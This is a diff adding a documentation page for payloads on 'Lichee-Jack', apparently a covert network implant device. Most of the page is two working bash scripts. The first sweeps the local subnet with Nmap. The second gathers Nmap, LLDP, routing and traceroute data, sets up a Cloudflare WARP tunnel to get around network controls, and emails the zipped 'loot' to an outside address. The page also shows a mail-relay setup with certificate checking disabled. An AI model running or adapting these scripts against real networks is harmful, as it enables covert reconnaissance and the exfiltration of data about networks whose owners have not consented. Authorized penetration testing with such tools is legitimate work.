@@ -1,0 +1,400 @@
+---
+title: Nmap
+---
+
+# Nmap
+
+This payload uses **Nmap** to perform fast and effective reconnaissance on the local network.
+
+It is typically executed after the Ethernet gadget is up and the host has assigned an IP address to Lichee-Jack.
+
+## What This Payload Does
+
+Depending on configuration, the Nmap payload can:
+
+* Discover live hosts in the same subnet
+* Identify open TCP ports
+* Detect common services and versions
+* Export scan results for later processing
+
+
+## Payload Examples
+
+### Nmap Sample
+
+A minimal **host discovery** payload using Nmap. It waits for the Ethernet interface to come up, acquires an IP address via DHCP, scans the local subnet, and stores results in the loot directory.
+
+LED states used by this payload:
+
+* **Yellow (slow fade)** — waiting for link / NetworkManager
+* **Yellow (blink)** — obtaining DHCP lease
+* **Red (fast blink)** — scanning in progress
+* **Green (slow fade)** — scan complete
+
+```sh showLineNumbers
+#!/usr/bin/bash
+# Title:         Sample Nmap Payload for Lichee-Jack
+# Author:        KaliAssistant <work.kaliassistant.github@gmail.com>
+# Version:       1.0
+#
+# Performs a ping scan on the local subnet and stores results as loot.
+
+readonly NMAP_OPTIONS="-sP --host-timeout 30s --max-retries 3"
+readonly LOOT_DIR=/root/loot.d/nmap-sample
+
+LED -c FF00FF # SETUP
+mkdir -p $LOOT_DIR
+COUNT=$(($(ls -l $LOOT_DIR/*.txt 2>/dev/null | wc -l) + 1))
+
+# Wait for interface up
+LED -c FFFF00 -l -d -s 100000
+while [ "$(cat /sys/class/net/end0/operstate)" = "down" ]; do
+  sleep 1
+done
+
+until systemctl -q is-active NetworkManager.service; do
+  sleep 1
+done
+
+NETMODE DHCP_CLIENT
+
+# Wait for DHCP
+LED -c FFFF00 -l -b -s 100000
+while [ -z "$SUBNET" ]; do
+  sleep 1
+  SUBNET=$(ip -4 addr show dev end0 | awk '/inet /{print $2}')
+done
+
+# Scan
+LED -c FF0000 -l -b -s 50000
+nmap $NMAP_OPTIONS $SUBNET -oN $LOOT_DIR/nmap-sample_$COUNT.txt
+
+LED -c 00FF00 -l -d -s 500000
+sleep 2
+sync
+```
+
+---
+
+### Nmap to Email (Advanced)
+
+A **full-featured recon payload** that combines multiple discovery techniques and optionally **exfiltrates results via email**.
+
+This payload can:
+
+* Run Nmap with service / OS detection
+* Collect LLDP neighbor information
+* Capture interface and routing state
+* Perform traceroutes to common endpoints
+* Query public IP / ASN metadata
+* Zip and email all loot automatically
+
+It also demonstrates:
+
+* Sequential loot directories
+* Background task coordination
+* Cloudflare WARP tunneling via `usque`
+* Offline-friendly LED state signaling
+
+```sh showLineNumbers
+#!/usr/bin/bash
+
+# Title:        Network Recon Payload with email exfiltration
+# Author:       KaliAssistant <work.kaliassistant.github@gmail.com> (Based on the orignial HAK5 sample payload TopKnot Network Recon Payload with email exfiltration)
+# Version:      1.0
+#
+#
+
+SEND_EMAIL=y
+MAIL_RCPT="user@domian.com"
+
+RUN_NMAP=y
+RUN_LLDPD=y
+RUN_IFCONFIG=y
+RUN_TRACEROUTE=y
+RUN_IPINFO=y
+
+LOOT_BASEDIR=/root/loot.d/nmap-to-email
+
+USE_USQUE_SENDMAIL=y
+USQUE_CONF_FILE=/root/.usque.conf
+
+NMAP_OPTIONS="-A -T4"
+NMAP_STYLESHEET_FILE=https://raw.githubusercontent.com/KaliAssistant/nmap-bootstrap-xsl/stable/nmap-bootstrap.xsl
+LLDPD_WAIT=120
+MUTT_FILE=/root/.muttrc
+
+
+function next_loot_dir() {
+  local base="${LOOT_BASEDIR}"
+  # Ensure base dir exists
+  mkdir -p "$base"
+
+  # Extract basename: /root/loot.d/nmap-to-email -> nmap-to-email
+  local prefix
+  prefix="$(basename "$base")"
+
+  local max=0
+  local n
+
+  shopt -s nullglob
+  for d in "$base"/"$prefix"-*; do
+    # ensure it's a directory
+    [[ -d "$d" ]] || continue
+    n="${d##*-}"
+    [[ "$n" =~ ^[0-9]+$ ]] || continue
+    (( n > max )) && max="$n"
+  done
+  shopt -u nullglob
+
+  local next=$((max + 1))
+  local newdir="$base/$prefix-$next"
+
+  mkdir "$newdir"
+  echo "$newdir"
+}
+
+
+function wait_ifup() {
+  LED -c FFFF00 -lds 100000
+  while [ "$(cat /sys/class/net/end0/operstate)" = "down" ]; do
+    sleep 1
+  done
+
+  until systemctl -q is-active NetworkManager.service
+  do
+    sleep 1
+  done
+}
+
+
+function setup() {
+
+  LED -c FF00FF
+
+  wait_ifup
+  sleep 0.3
+  NETMODE DHCP_CLIENT
+
+  LED -c FFFF00 -lbs 100000 # WAIT DHCP
+  while [ -z "$SUBNET" ]; do
+    sleep 1 && SUBNET=$(ip addr | grep -i end0 | grep -i inet | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}[\/]{1}[0-9]{1,2}")
+  done
+  GATEWAY_IP=$(ip route show default dev end0 | awk '$1=="default"{for(i=1;i<=NF;i++) if($i=="via") print $(i+1)}')
+  CURRENT_LOOTDIR=$(next_loot_dir)
+
+}
+
+
+
+function run_nmap() {
+  local MYIP=$(echo "$SUBNET" | cut -d/ -f1)
+  nmap $NMAP_OPTIONS -oA $CURRENT_LOOTDIR/nmap-scan --stylesheet $NMAP_STYLESHEET_FILE --exclude $MYIP $SUBNET &>/dev/null &
+  NMAP_PID=$!
+}
+
+function run_lldpd() {
+  systemctl start lldpd.service
+  sleep $LLDPD_WAIT
+
+  lldpcli show neighbor details > $CURRENT_LOOTDIR/lldpd-neighbor.txt
+  lldpcli show interfaces details > $CURRENT_LOOTDIR/lldpd-interfaces.txt
+}
+
+function run_ifconfig() {
+  ifconfig end0 > $CURRENT_LOOTDIR/ifconfig-if.txt
+  ip addr show dev end0 > $CURRENT_LOOTDIR/ifconfig-ip.txt
+  ip route show all > $CURRENT_LOOTDIR/ifconfig-iproute.txt
+}
+
+function run_traceroute() {
+  traceroute 8.8.8.8 > $CURRENT_LOOTDIR/traceroute-googledns.txt
+  traceroute 1.1.1.1 > $CURRENT_LOOTDIR/traceroute-cfdns.txt
+  traceroute 162.159.198.1 > $CURRENT_LOOTDIR/traceroute-cf.txt
+}
+
+function run_ipinfo() {
+  curl ipinfo.io > $CURRENT_LOOTDIR/ipinfo.json
+}
+
+
+function cf_warp() {
+  usque_pid=""
+  local ports=(443 500 1701 4500 4443 8443 8095)
+
+  for _port in "${ports[@]}"; do
+    usque nativetun -c $USQUE_CONF_FILE -n cf-warp -P $_port 1>&2 &
+    usque_pid=$!
+    sleep 6
+    if ! kill -0 "$usque_pid" 1>&2 2>/dev/null; then
+      echo "ERR_EXEC"
+      usque_pid=""
+      return
+    fi
+
+    if ping -c 4 1.1 -I cf-warp 1>&2; then
+      echo "SUCCESS"
+      return
+    fi
+
+    kill "$usque_pid" 1>&2 2>/dev/null
+    usque_pid=""
+  done
+  echo "ERR_CONN"
+  return
+}
+
+function send_email() {
+  if [ "$USE_USQUE_SENDMAIL" = "y" ]; then
+    local err="$(cf_warp)"
+    if [ "$err" = "SUCCESS" ]; then
+
+      ip route add 162.159.198.1/32 via $GATEWAY_IP dev end0
+      ip route add default dev cf-warp && ip -6 route add default dev cf-warp
+
+    fi
+  fi
+
+  zip -0 -r /tmp/LOOT_NMAP_TO_EMAIL.zip $CURRENT_LOOTDIR
+
+  echo "You have new loot from Lichee-Jack!" | mutt -F $MUTT_FILE -a /tmp/LOOT_NMAP_TO_EMAIL.zip -s "Lichee-Jack Loot" -- $MAIL_RCPT
+
+  sleep 1
+  pkill usque
+}
+
+function run() {
+  setup
+
+  LED -c FF0000 -lbs 50000
+  if [ "$RUN_NMAP" = "y" ]; then
+    run_nmap
+  else
+    NMAP_PID=""
+  fi
+
+  if [ "$RUN_LLDPD" = "y" ]; then
+    run_lldpd
+  fi
+
+  if [ "$RUN_IFCONFIG" = "y" ]; then
+    run_ifconfig
+  fi
+
+  if [ "$RUN_TRACEROUTE" = "y" ]; then
+    run_traceroute
+  fi
+
+  if [ "$RUN_IPINFO" = "y" ]; then
+    run_ipinfo
+  fi
+
+  if [ -n "$NMAP_PID" ]; then
+    wait "$NMAP_PID" 2>/dev/null
+  fi
+  LED -c FFFFFF -lbs 100000
+  systemctl stop lldpd.service
+  sync
+  sleep 1
+
+  if [ "$SEND_EMAIL" = "y" ]; then
+    send_email
+    sleep 3
+  fi
+
+  LED -c 00FF00 -lds 500000
+  sleep 1
+  exit 0
+}
+
+run
+```
+
+---
+
+#### Email Exfiltration Setup
+
+The advanced payload uses **`mutt` + `msmtp`** for mail delivery.
+
+#### msmtp configuration
+
+Edit `/etc/msmtprc`:
+
+```
+account default
+
+host smtp.gmail.com
+port 587
+auth on
+user user@gmail.com
+password gmail-password
+
+auto_from off
+from user@gmail.com
+
+tls on
+tls_starttls on
+tls_certcheck off
+
+syslog LOG_MAIL
+```
+
+> [!NOTE]
+>
+>  Use application-specific passwords where possible.
+
+---
+
+#### mutt configuration
+
+Create or edit `~/.muttrc`:
+
+```
+set sendmail="/usr/bin/msmtp"
+set use_from=yes
+set realname="Lichee-Jack"
+set from=user@gmail.com
+set envelope_from=yes
+```
+
+---
+
+#### Test Email Commands
+
+Send email with attachment:
+
+```
+echo "Test message" | mutt -a "/root/file-to-attach" -s "Lichee-Jack Loot" -- recipient@domain.com
+```
+
+Send email without attachment:
+
+```
+echo "Test message" | mutt -s "Lichee-Jack Test" -- recipient@domain.com
+```
+
+---
+
+#### usque (Cloudflare WARP Tunnel)
+
+This payload optionally uses **`usque`** to establish a Cloudflare WARP tunnel for outbound connectivity.
+
+Registration details:
+
+[https://github.com/Diniboy1123/usque?tab=readme-ov-file#registration](https://github.com/Diniboy1123/usque?tab=readme-ov-file#registration)
+
+Example registration command:
+
+```
+yes y | usque -c $CONFFILE register
+```
+
+---
+
+## Notes
+
+* Recon payloads should always include **clear LED state indicators**
+* Avoid aggressive scan profiles on unstable links
+* Email exfiltration may be blocked by captive portals or firewalls
+* Always obtain **explicit authorization** before deployment
+
